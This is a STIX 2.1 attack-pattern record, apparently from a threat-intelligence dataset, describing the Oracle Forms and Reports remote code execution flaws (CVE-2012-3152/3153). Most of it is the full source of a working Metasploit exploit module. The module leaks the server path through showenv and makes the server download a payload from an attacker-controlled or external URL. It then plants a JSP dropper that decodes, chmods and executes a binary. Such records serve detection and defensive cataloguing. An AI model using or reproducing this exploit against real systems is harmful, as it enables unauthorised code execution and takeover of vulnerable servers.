{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e263fe87-3926-4ce7-a291-add39a6188bd",
    "created": "2024-08-14T17:10:50.292699Z",
    "modified": "2024-08-14T17:10:50.292703Z",
    "name": "Oracle Forms and Reports Remote Code Execution",
    "description": " This module uses two vulnerabilities in Oracle Forms and Reports to get remote code execution on the host. The showenv url can be used to disclose information about a server. A second vulnerability that allows arbitrary reading and writing to the host filesystem can then be used to write a shell from a remote url to a known local path disclosed from the previous vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/oracle_reports_rce.rb",
            "external_id": "oracle_reports_rce.rb"
        },
        {
            "source_name": "\"CVE\"",
            "external_id": "\"2012-3152\""
        },
        {
            "source_name": "\"CVE\"",
            "external_id": "\"2012-3153\""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  Rank = GreatRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Oracle Forms and Reports Remote Code Execution',\n      'Description'     => %q{\n      This module uses two vulnerabilities in Oracle Forms and Reports to get remote code execution\n      on the host. The showenv url can be used to disclose information about a server. A second\n      vulnerability that allows arbitrary reading and writing to the host filesystem can then be\n      used to write a shell from a remote url to a known local path disclosed from the previous\n      vulnerability.\n\n      The local path being accessible from an URL allows an attacker to perform the remote code\n      execution using, for example, a .jsp shell.\n\n      This module was tested successfully on Windows and Oracle Forms and Reports 10.1.\n      },\n      'Author'          =>\n        [\n          'miss_sudo <security[at]netinfiltration.com>', # Vulnerability discovery\n          'Mekanismen <mattias[at]gotroot.eu>' # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ \"CVE\", \"2012-3152\" ],\n          [ \"CVE\", \"2012-3153\" ],\n          [ \"OSVDB\", \"86395\" ], # Matches CVE-2012-3152\n          [ \"OSVDB\", \"86394\" ], # Matches CVE-2012-3153\n          [ \"EDB\", \"31253\" ]\n        ],\n      'Stance'          => Msf::Exploit::Stance::Aggressive,\n      'Platform'        => ['win', 'linux'],\n      'Targets'         =>\n        [\n          [ 'Linux',\n            {\n            'Arch' => ARCH_X86,\n            'Platform' => 'linux'\n            }\n          ],\n          [ 'Windows',\n            {\n            'Arch' => ARCH_X86,\n            'Platform' => 'win'\n            }\n          ],\n        ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2014-01-15'\n    ))\n    register_options(\n      [\n        OptString.new('EXTURL', [false, 'An external host to request the payload from', \"\" ]),\n        OptString.new('PAYDIR', [true, 'The folder to download the payload to', \"/images/\" ]),\n        OptInt.new('HTTPDELAY', [false, 'Time that the HTTP Server will wait for the payload request', 10]),\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"/reports/rwservlet/showenv\"),\n      'method' => 'GET'\n      })\n\n    if res and res.code == 200\n      if res.body =~ /\\\\(.*)\\\\showenv/\n        vprint_good \"Windows install detected \"\n        path = $1.gsub(\"\\\\\", \"/\")\n        vprint_status \"Path:  #{path}\"\n      elsif res.body =~ /\\/(.*)\\/showenv/\n        vprint_good \"Linux install detected\"\n        vprint_status \"Path:  #{$1}\"\n      else\n        return Exploit::CheckCode::Safe\n      end\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"/reports/rwservlet\"),\n      'method' => 'GET',\n       'vars_get' => {\n       'report' => 'test.rdf',\n       'desformat' => 'html',\n       'destype' => 'cache',\n       'JOBTYPE' => 'rwurl',\n       'URLPARAMETER' => 'file:///'\n       }\n      })\n\n    if res and res.code == 200 and res.body.downcase.exclude?(\"<html>\")\n      vprint_good \"URLPARAMETER is vulnerable\"\n      return Exploit::CheckCode::Vulnerable\n    else\n      vprint_status \"URLPARAMETER is not vulnerable\"\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    @payload_url = \"\"\n    @payload_name = rand_text_alpha(8+rand(8)) + \".jsp\"\n    @payload_dir = datastore['PAYDIR']\n    @local_path = \"\"\n\n    print_status \"Querying showenv!\"\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"/reports/rwservlet/showenv\"),\n      'method' => 'GET',\n      })\n\n    if res and res.code == 200\n      if res.body =~ /\\\\(.*)\\\\showenv/\n        print_good \"Query succeeded!\"\n        print_status \"Windows install detected \"\n        @local_path = $1.gsub(\"\\\\\", \"/\")\n        print_status \"Path: #{@local_path }\"\n      elsif res.body =~ /\\/(.*)\\/showenv/\n        print_good \"Query succeeded!\"\n        print_status \"Linux install detected\"\n        @local_path = $1\n        print_status \"Path:  #{@local_path }\"\n      else\n        print_error \"Query failed\"\n        fail_with(Failure::Unknown, \"#{peer} - target is not vulnerable or unreachable\")\n      end\n    else\n      fail_with(Failure::Unknown, \"#{peer} - target is not vulnerable or unreachable\")\n    end\n\n    if datastore['EXTURL'].blank?\n      print_status \"Hosting payload locally ...\"\n      begin\n        Timeout.timeout(datastore['HTTPDELAY']) {super}\n      rescue Timeout::Error\n      end\n      exec_payload\n    else\n      print_status \"Using external url for payload delivery ...\"\n      @payload_url = datastore['EXTURL']\n      upload_payload\n      exec_payload\n    end\n  end\n\n  def primer\n    @payload_url = get_uri\n    @pl = gen_file_dropper\n    upload_payload\n  end\n\n  def on_request_uri(cli, request)\n    send_response(cli, @pl)\n  end\n\n  def autofilter\n    true\n  end\n\n  def upload_payload\n    print_status \"Uploading payload ...\"\n    path = \"/#{@local_path}#{@payload_dir}#{@payload_name}\"\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"/reports/rwservlet\"),\n      'method' => 'GET',\n      'encode_params' => false,\n      'vars_get' => {\n        'report' => 'test.rdf',\n        'desformat' => 'html',\n        'destype' => 'file',\n        'desname' => path,\n        'JOBTYPE' => 'rwurl',\n        'URLPARAMETER' => @payload_url\n       }\n    })\n\n    if res and res.code == 200\n      print_good \"Payload hopefully uploaded!\"\n    else\n      print_error \"Payload upload failed\"\n    end\n  end\n\n  def gen_file_dropper\n    big_payload =  false #size matters :(\n\n    gen_payload_name  = rand_text_alpha(8+rand(8))\n    encoded_pl  = Rex::Text.encode_base64(generate_payload_exe)\n    print_status \"Building JSP shell ...\"\n\n    len = encoded_pl.length\n    if len >= 60000 #java string size limit ~60k workaround\n      print_status \"Adjusting shell due to payload size\"\n      pl_first = encoded_pl.slice(0, 60000)\n      pl_second = encoded_pl.slice(60000, len)\n      big_payload = true\n    end\n\n    #embed our payload\n    shell  = \"<%@ page import=\\\"java.util.*,java.io.*, sun.misc.BASE64Decoder\\\"%>\"\n    shell += \" <%\"\n    shell += \" BASE64Decoder decoder = new BASE64Decoder();\"\n    #correct file suffix if windows\n    if datastore['TARGET'] == 1\n      shell += \" File temp = File.createTempFile(\\\"#{gen_payload_name}\\\", \\\".exe\\\");\"\n    else\n      shell += \" File temp = File.createTempFile(\\\"#{gen_payload_name}\\\", \\\".tmp\\\");\"\n    end\n    shell += \" String path = temp.getAbsolutePath();\"\n    if big_payload\n      shell += \" byte [] pl = decoder.decodeBuffer(\\\"#{pl_first}\\\");\"\n      shell += \" byte [] pltwo = decoder.decodeBuffer(\\\"#{pl_second}\\\");\"\n\n      shell += \" BufferedOutputStream ou = new BufferedOutputStream(new FileOutputStream(path));\"\n      shell += \" ou.write(pl);\"\n      shell += \" ou.close();\"\n\n      shell += \" ou = new BufferedOutputStream(new FileOutputStream(path, true));\"\n      shell += \" ou.write(pltwo);\"\n      shell += \" ou.close();\"\n    else\n      shell += \" byte [] pl = decoder.decodeBuffer(\\\"#{encoded_pl}\\\");\"\n      shell += \" BufferedOutputStream ou = new BufferedOutputStream(new FileOutputStream(path));\"\n      shell += \" ou.write(pl);\"\n      shell += \" ou.close();\"\n    end\n    #correct rights if linux host\n    if datastore['TARGET'] == 0\n      shell += \" Process p = Runtime.getRuntime().exec(\\\"/bin/chmod 700 \\\" + path);\"\n      shell += \" p.waitFor();\"\n    end\n    shell += \" Runtime.getRuntime().exec(path);\"\n    shell += \"%>\"\n\n    return shell\n  end\n\n  def exec_payload\n    print_status(\"Our payload is at: /reports#{@payload_dir}#{@payload_name}\")\n    print_status(\"Executing payload...\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"reports\", @payload_dir, @payload_name),\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200\n       print_good(\"Payload executed!\")\n    else\n       print_error(\"Payload execution failed\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-01-15",
    "x_mitre_platforms": [
        "win"
    ]
}